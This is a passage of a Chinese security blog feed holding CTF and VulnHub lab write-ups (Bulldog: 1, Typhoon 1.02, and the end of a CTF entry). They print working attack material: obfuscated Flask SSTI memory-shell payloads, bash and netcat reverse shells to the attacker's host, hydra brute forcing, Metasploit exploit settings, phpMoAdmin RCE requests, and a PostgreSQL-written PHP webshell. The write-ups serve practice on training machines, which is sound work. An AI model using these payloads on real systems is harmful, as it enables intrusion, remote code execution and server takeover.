class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>网站的<code>/hint</code>文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> method==<span class="string">&quot;POST&quot;</span>:</span><br><span class="line">    template = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> waf(template):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker Found&quot;</span></span><br><span class="line">    result = render_template_string(template)</span><br></pre></td></tr></table></figure><p>原始内存马:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)</span><br></pre></td></tr></table></figure><p>变形payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request.application</span><br><span class="line"></span><br><span class="line">request.application.__self__._get_data_for_json.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).__getitem__(&#x27;__bui&#x27;+&#x27;ltins__&#x27;).__getitem__(&#x27;ex&#x27;+&#x27;ec&#x27;)(&quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;, &#x27;calc&#x27;)).read())&quot;,&#123;&#x27;_request_ct&#x27;+&#x27;x_stack&#x27;:get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;_request_&#x27;+&#x27;ctx_stack&#x27;),&#x27;app&#x27;:get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;curre&#x27;+&#x27;nt_app&#x27;)&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="json"><a class="header-anchor" href="#json">¶</a>json</h2><p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">CVE-2022-25845</a></p><p>直接改poc.java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> <span class="string">&quot;http://7dcef4ada4bd5d44.node.nsctf.cn/json&quot;</span>;  </span><br><span class="line"><span class="keyword">static</span> <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="string">&quot;file:///flag&quot;</span>;</span><br></pre></td></tr></table></figure><p>跑poc即可</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/abc781218700e2248a5bfd8bbffdd815.png" alt="abc781218700e2248a5bfd8bbffdd815.png"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 内存马 </tag>
            
            <tag> fake mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bulldog-1</title>
      <link href="/article/Bulldog-1/"/>
      <url>/article/Bulldog-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Bulldog: 1</h1><hr><p>easyNo.11</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/bulldog-1,211/">vulnhub靶场-Bulldog: 1</a></p><p>目标: get into the root directory and see the congratulatory message.</p><p>提示: if you get stuck, try to figure out all the different ways you can interact with the system. That’s my only hint ;)</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.22</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -A 192.168.56.22</span><br><span class="line"></span><br><span class="line">PORT  STATE SERVICE  VERSION</span><br><span class="line">23    open  ssh      OpenSSH 7.2p2</span><br><span class="line">80    open  http     WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">8080  open  http     WSGIServer 0.1 (Python 2.7.12)</span><br></pre></td></tr></table></figure><p>访问80端口(8080和80的内容似乎是一样的, 就不管了), 大意是我们被黑客入侵了, 目前正在评估风险; 访问公告, 发现来自技术人员的提示<code>clam shell and a smelly cow</code></p><p>看着像是在说脏牛漏洞, 另一个不知道是什么</p><p>进行目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[23:05:21] 301 -    0B  - /admin       </span><br><span class="line">[23:05:28] 200 -    3KB - /dev/</span><br><span class="line">[23:05:38] 200 -    1KB - /robots.txt</span><br></pre></td></tr></table></figure><p><code>/admin</code>是后台登录界面, <code>/robots.txt</code>没东西</p><p><code>/dev/</code>像是给员工的公告, 解释了上一个黑客入侵的方法和他们之后要做什么:</p><ol><li>上一个入侵者利用漏洞获取低权限shell然后脏牛提权, 虽然他们要彻底取消php, 但是他们还在用之前的文件, 所以这个是可能的提权点</li><li>他自己说的开放了SSH, 网站用的Django, 数据库似乎启用的MongoDB</li><li>给了一个Web-Shell接口, 提示需要进行服务器身份验证后才能使用接口</li><li>给了一些练习人名称, 扒拉下来可能要爆破用户</li><li>查看源码, 发现前端中给出了对应用户的密码哈希值</li></ol><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123123814.png" alt="image.png"></p><p>有哈希值, 其他地方又没有利用方法, 那就只能爆破哈希值了</p><p><a href="https://www.somd5.com/">输入让你无语的MD5</a></p><p>可以拿到最后的两个md5的明文, 利用对应的用户名和密码进行登录; 其中一个账号密码如下: <code>nick : bulldog</code></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>登陆之后, 之前的Web-Shell就可以使用了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123133116.png" alt="image.png"></p><p>很显然这里有waf, 只能执行部分命令; 但是管道符和反引号执行命令是非常好的东西</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `<span class="built_in">ls</span>`</span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">cat</span> manage.py`</span><br><span class="line"><span class="comment"># 这个似乎用不了, 挺奇怪的</span></span><br><span class="line"><span class="built_in">echo</span> `bash -i &gt;&amp; /dev/tcp/192.168.56.5/1234 0&gt;&amp;1`</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ls&#x27;</span> | bash</span><br><span class="line"><span class="comment"># 这个可以</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.5/1234 0&gt;&amp;1&#x27;</span> | bash</span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux bulldog 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.4.0-87-generic 好熟悉的版本</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看发行版的信息 Ubuntu 16.04.3 LTS </span></span><br><span class="line"><span class="comment"># 有点高了</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 查看环境, 无gcc</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看权限, 无</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, 无发现</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看计划任务, 无发现</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>看看能不能切换用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 看看有没有其他用户, 有一个bulldogadmin</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep -P <span class="string">&#x27;^[^:]+:[^:]+:(\d&#123;4,&#125;):&#x27;</span> </span><br></pre></td></tr></table></figure><p>尝试直接进入用户文件夹<code>/home/bullaodadmin</code>, 成功</p><p>进入隐藏文件夹<code>.hiddenadmindirectory</code>, 里面有一个程序?还有一个note, 这个note大概意思是: 这个程序还是原型, 主要功能为输入你的账户密码，它就会判断你是否有权访问某个文件</p><p>我们没有账号密码(似乎可以爆破), 下载似乎不行; 回头一想, 既然只是一个未完成的程序, 应该会直接将鉴权内容写在程序中(没有数据库等交互), 可能是某个账户的密码</p><p>来看看这个程序中有什么字符串吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings customPermissionApp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123144930.png" alt="image.png"></p><p>可以看到这里是通过先自程序自身提权到root权限然后再进行判断的, 那么这里可以获取的字符串大概率是root的密码或者是sudo的密码</p><p>跑了一遍, 发现都不对, 应该是被混淆了, 这个看上去像是提示?</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123153120.png" alt="image.png"></p><p>去掉H后是<code>SUPERultimatePASSWORDyouCANTget</code>, 你无法得到的终极密码, 那就是你了</p><blockquote><p>提权前先用python创建一个新的会话才能提权, 就用最上面的妙妙工具即可<code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>和程序里面的步骤一致即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su root</span><br><span class="line"><span class="comment"># SUPERultimatePASSWORDyouCANTget</span></span><br></pre></td></tr></table></figure><p>看看<code>sudo -l</code>会发现可以在任何位置执行sudo, 要不是没有密码早就爆了</p><p>尝试了一些提权脚本, 没成功; 不管了, 反正拿到root目录下的flag就好了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123160109.png" alt="image.png"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">alan@bulldogindustries.com</span><br><span class="line"><span class="comment">&lt;!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&gt;</span></span><br><span class="line"></span><br><span class="line">william@bulldogindustries.com</span><br><span class="line"><span class="comment">&lt;!--38882f3b81f8f2bc47d9f3119155b05f954892fb--&gt;</span></span><br><span class="line"></span><br><span class="line">malik@bulldogindustries.com</span><br><span class="line"><span class="comment">&lt;!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&gt;</span></span><br><span class="line"></span><br><span class="line">kevin@bulldogindustries.com</span><br><span class="line"><span class="comment">&lt;!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&gt;</span></span><br><span class="line"></span><br><span class="line">ashley@bulldogindustries.com</span><br><span class="line"><span class="comment">&lt;!--553d917a396414ab99785694afd51df3a8a8a3e0--&gt;</span></span><br><span class="line"></span><br><span class="line">nick@bulldogindustries.com</span><br><span class="line"><span class="comment">&lt;!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&gt;</span></span><br><span class="line">bulldog</span><br><span class="line"></span><br><span class="line">sarah@bulldogindustries.com</span><br><span class="line"><span class="comment">&lt;!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</span></span><br><span class="line">bulldoglover</span><br></pre></td></tr></table></figure><p>获取到bullaodadmin用户之后, 可以尝试爆破, 我字典差, 爆不出来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -s 23 -l 用户名 -P 字典 ssh://192.168.56.22</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反弹shell </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typhoon-1.02</title>
      <link href="/article/Typhoon-1-02/"/>
      <url>/article/Typhoon-1-02/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Typhoon: 1.02</h1><hr><p>easyNo.10</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/typhoon-102,267/">vulnhub靶场-Typhoon: 1.02</a></p><p>目标: 根据描述也许是getshell而不是getroot</p><p>描述: Typhoon VM contains several vulnerabilities and configuration errors.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.21</li></ul><h2 id="利用过程"><a class="header-anchor" href="#利用过程">¶</a>利用过程</h2><p>我觉得这个不像那种特定的靶机, 更像是那种靶场集合; 而且引用的文件有些经过谷歌的, 这导致请求非常慢, 准备好一些妙妙工具</p><h3 id="端口和服务发现"><a class="header-anchor" href="#端口和服务发现">¶</a>端口和服务发现</h3><p>nmap进行ip发现和端口扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -A -p 0-25535 192.168.56.21</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">110/tcp   open  pop3</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">143/tcp   open  imap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">631/tcp   open  ipp</span><br><span class="line">993/tcp   open  imaps</span><br><span class="line">995/tcp   open  pop3s</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">5432/tcp  open  postgresql</span><br><span class="line">6379/tcp  open  redis</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">27017/tcp open  mongod</span><br></pre></td></tr></table></figure><h3 id="21-ftp"><a class="header-anchor" href="#21-ftp">¶</a>21 ftp</h3><p>存在匿名登录, 可是没有东西</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 192.168.56.21</span><br><span class="line">anonymous</span><br><span class="line"><span class="comment"># 密码为空</span></span><br></pre></td></tr></table></figure><h3 id="22-ssh"><a class="header-anchor" href="#22-ssh">¶</a>22 ssh</h3><p>不知道用户名和密码可以直接开爆; 不过一般的主机都有登录限制, 这个只能说不通用吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search scanner/ssh</span><br><span class="line">use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line">options</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117185137.png" alt="image.png"></p><p>得到用户admin, 尝试爆破密码, 真给我爆出来了; ssh登录即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.21</span><br><span class="line"><span class="comment"># admin : metallica</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117185939.png" alt="image.png"></p><blockquote><p>msf框架下其他指令也是正常执行的, 不用当出来再进去的怨种</p></blockquote><h3 id="25-smtp"><a class="header-anchor" href="#25-smtp">¶</a>25 smtp</h3><p>通常用于信息收集, 比如这个就是用户名枚举</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smtp-user-enum -M VRFY -U user.txt -t 192.168.56.21</span><br></pre></td></tr></table></figure><h3 id="80-http"><a class="header-anchor" href="#80-http">¶</a>80 http</h3><p>从80端口下手, 进行目录扫描, 以下是一些可能有用的目录:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[05:42:31] 301 -  311B  - /cms</span><br><span class="line">[05:42:33] 301 -  314B  - /drupal</span><br><span class="line">[05:42:34] 302 -    0B  - /dvwa/</span><br><span class="line">[05:42:41] 301 -  318B  - /phpmyadmin</span><br><span class="line">[05:42:43] 200 -   37B  - /robots.txt</span><br></pre></td></tr></table></figure><p>尝试用弱密码/默认密码登录<code>/cms</code>, <code>/phpmyadmin</code>和<code>/drupal</code>, 均以失败告终; 而<code>/dvwa</code>倒是有, 而且警告似乎也说了可能被利用</p><h4 id="Drupal-CMS"><a class="header-anchor" href="#Drupal-CMS">¶</a>Drupal CMS</h4><p>先试试Drupal CMS(<code>CVE-2018-7600</code>), 这个毕竟在msf中有对应利用模块</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.56.21</span><br><span class="line"><span class="built_in">set</span> targeturi /drupal</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.56.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>然后就拿到shell了, 权限为www-data</p><h4 id="phpMoAdmin"><a class="header-anchor" href="#phpMoAdmin">¶</a>phpMoAdmin</h4><p>从<code>/robots.txt</code>中可以拿到<code>/mongoadmin/</code>, 访问的时候似乎是个管理MongoDB库的小工具phpMoAdmin</p><p>存在就一定有存在的理由; 多翻了几下, 反正就是在某个类似表的creds下找到了用户名和密码<code>typhoon : 789456123</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117190409.png" alt="image.png"></p><blockquote><p>如果告诉你没数据或者没加载出来, 切换一下数据库(默认是个admin?)</p></blockquote><p>或者可以点击那个stats查看版本信息, 可以得到phpMoAdmin版本为1.0.9, 可以找到一些立刻使用的RCE payload</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.56.21/mongoadmin/index.php -d <span class="string">&quot;object=1;system(&#x27;whoami&#x27;);//&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://192.168.56.21/mongoadmin/index.php?collection=admin&amp;action=listRows&amp;find=array();passthru(&quot;uname%20-a&quot;);exit;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="Lotus-CMS"><a class="header-anchor" href="#Lotus-CMS">¶</a>Lotus CMS</h4><p>搜索lotuscms, 这个cms同样在msf中有利用脚本, 对应漏洞为<code>CVE-2011-0518</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search lotuscms</span><br><span class="line">use exploit/multi/http/lcms_php_exec</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.56.5</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.56.21</span><br><span class="line"><span class="built_in">set</span> uri /cms/</span><br><span class="line"><span class="comment"># 记得换端口</span></span><br></pre></td></tr></table></figure><h3 id="445-smb"><a class="header-anchor" href="#445-smb">¶</a>445 smb</h3><p>不愧是永恒之蓝, 直接拿到root权限; 虽然这个不是很稳定, 但是已经可以做很多事了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/linux/samba/is_known_pipename</span><br><span class="line">set rhost 192.168.56.21</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250118163101.png" alt="image.png"></p><h3 id="2049-nfs"><a class="header-anchor" href="#2049-nfs">¶</a>2049  nfs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">showmount -e 192.168.56.21</span><br><span class="line"><span class="comment"># /typhoon *</span></span><br><span class="line">mount -t nfs 192.168.56.21:/typhoon /tmp/nfs</span><br></pre></td></tr></table></figure><p>挂载后可以进入, 一共三个secret, 一个flag, 一个让你登录typhoon用户, 一个是rsa文件; 那没什么好说的</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117193837.png" alt="image.png"></p><h3 id="5432-postgresql"><a class="header-anchor" href="#5432-postgresql">¶</a>5432 postgresql</h3><p>先获取用户名和密码, 这个似乎就是遍历所有的默认账密</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search postgres</span><br><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.56.21</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250117231858.png" alt="image.png"></p><p><code>postgres:postgres@template1</code>, 利用对应程序登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">psql -h 192.168.56.21 -U postgres</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列目录</span></span><br><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line"><span class="comment"># 读取权限允许的文件</span></span><br><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;postgresql.conf&#x27;</span>,0,1000);</span><br><span class="line"><span class="comment"># 建表,并使用copy从文件写入数据到表用于读取/etc/passwd第一行</span></span><br><span class="line">DROP TABLE <span class="keyword">if</span> EXISTS MrLee;CREATE TABLE MrLee(t TEXT);COPY MrLee FROM <span class="string">&#x27;/etc/passwd&#x27;</span>;<span class="keyword">select</span> * from MrLee <span class="built_in">limit</span> 1 offset 0;</span><br><span class="line"><span class="comment"># 直接读出所有数据</span></span><br><span class="line">SELECT * FROM MrLee;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建OID，清空内容</span></span><br><span class="line">SELECT lo_create(998);</span><br><span class="line">delete from pg_largeobject <span class="built_in">where</span> loid=998;</span><br><span class="line"><span class="comment"># 写入经过加密的一句话木马</span></span><br><span class="line"><span class="comment"># &lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;</span></span><br><span class="line">insert into pg_largeobject (loid,pageno,data) values(998, 0, decode(<span class="string">&#x27;3C3F70687020406576616C28245F504F53545B27313233275D293B3F3E&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure><p>数据将被插入到<code>pg_largeobject</code>表中。它指定将插入数据的列：<code>loid</code>、<code>pageno</code>和<code>data</code>。</p><ul><li><code>998</code>是该列的值<code>loid</code>。</li><li><code>0</code>是该列的值<code>pageno</code>。</li><li><code>decode('3C3F70687020406576616C28245F504F53545B27313233275D293B3F3E', 'hex')</code>是该列的值<code>data</code>。这部分将十六进制字符串解码</li></ul><p>将id998的内容写到<code>/var/www/html/shell.php</code>内, 使用蚁剑连接即可</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_export(<span class="number">998</span>,<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>lo_export函数是一个 PostgreSQL 函数，它将大对象的数据导出到服务器文件系统上的文件中。在本例中，它从loid值为 的大对象中导出数据998lo_export函数是一个 PostgreSQL 函数，它将大对象的数据导出到服务器文件系统上的文件中。在本例中，它从loid值为 的大对象中导出数据998</p></blockquote><h3 id="6379-redis"><a class="header-anchor" href="#6379-redis">¶</a>6379 redis</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.56.21</span><br></pre></td></tr></table></figure><ol><li>利用redis写webshell</li><li>利用”公私钥”认证获取root权限</li><li>利用crontab反弹shell</li></ol><p>反正这里利用不了, 到时候其他地方能用的时候再写吧</p><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">Redis未授权访问漏洞复现与利用</a></p><h3 id="8080-tomcat"><a class="header-anchor" href="#8080-tomcat">¶</a>8080 tomcat</h3><p>访问8080, 发现是tomcat7且有<code>manager webapp</code>的登录; 可以使用Tomcat Manager Upload获取shell</p><blockquote><p>默认用户名和默认密码均为tomcat</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search tomcat manager</span><br><span class="line">use exploit/multi/http/tomcat_mgr_upload</span><br><span class="line"><span class="comment"># 还有一个tomcat_mgr_deploy, 我没试过</span></span><br><span class="line"><span class="built_in">set</span> httppassword tomcat</span><br><span class="line"><span class="built_in">set</span> httpusername tomcat</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.56.5</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.56.21</span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line"><span class="comment"># 记得换端口</span></span><br></pre></td></tr></table></figure><blockquote><p>我出现了上传成功但是告诉我找不到payload的问题, 这时候只需要退出msf然后进行更新<code>apt-get install metasploit-framework</code>, 然后我就解决了</p></blockquote><p><a href="https://wh0ale.github.io/2018/12/23/2018-12-23-%E5%88%A9%E7%94%A8Tomcat%20Manager%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/">利用Tomcat Manager的多种方法</a></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>如果是admin用户:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发现任意位置都可以sudo执行</span></span><br><span class="line">sudo -l</span><br><span class="line">sudo bash</span><br></pre></td></tr></table></figure><p>如果不是admin用户:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux typhoon.local 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 3.13.0-32-generic</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看发行版 Ubuntu 14.04</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 查看权限, 无</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, 无发现</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看计划任务, 无发现</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>看来还是得用内核漏洞; Ubuntu 14.04, 也是非常经典存在内核漏洞的版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit  3.13.0</span><br><span class="line">searchsploit -m 37292.c </span><br></pre></td></tr></table></figure><blockquote><p>45010.c 似乎也可以</p></blockquote><p>或者, 还有一种方法</p><p>在<code>/tab</code>下有一个<code>script.sh</code>文件, 该文件是root权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我实在没写出来怎么排除permission denied的命令</span></span><br><span class="line"><span class="comment"># 这里找到一个/tab／script.sh且没有permission denied</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.sh&quot;</span> -user root</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250118153233.png" alt="image.png"></p><p>此时我们可以写一个反弹shell进这个bash文件用于直接获得root权限, 可以用msf来生成反弹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 奇怪, 有时候直接复制会报错</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.56.5 lport=1234 R</span><br><span class="line"><span class="comment"># mkfifo /tmp/trzkdwp; nc 192.168.56.21 1234 0&lt;/tmp/trzkdwp | /bin/sh &gt;/tmp/trzkdwp 2&gt;&amp;1; rm /tmp/trzkdwp</span></span><br></pre></td></tr></table></figure><p>写入/监听/运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mkfifo /tmp/trzkdwp; nc 192.168.56.5 1234 0&lt;/tmp/trzkdwp | /bin/sh &gt;/tmp/trzkdwp 2&gt;&amp;1; rm /tmp/trzkdwp&quot;</span> &gt; script.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali</span></span><br><span class="line">nc -lvnp 1234</span><br><span class="line"><span class="comment"># target</span></span><br><span class="line">./script.sh</span><br></pre></td></tr></table></figure><p>有时候权限还是原来的权限, 退出重新试试就好了</p><p>反正最后都是在root目录下找到root-flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250118160200.png" alt="image.png"></p><h1>附录</h1><p>已复现</p><ul><li>drupal漏洞利用</li><li>SSH端口爆破</li><li>phpMoAdmin利用</li><li>LotusCMS漏洞利用</li><li>Tomcat漏洞利用</li><li>5432 PostgreSQL漏洞利用</li><li>Linux版永恒之蓝 445端口（139端口）</li></ul><p>未复现</p><ul><li><p>Shellshock漏洞利用</p><p><a 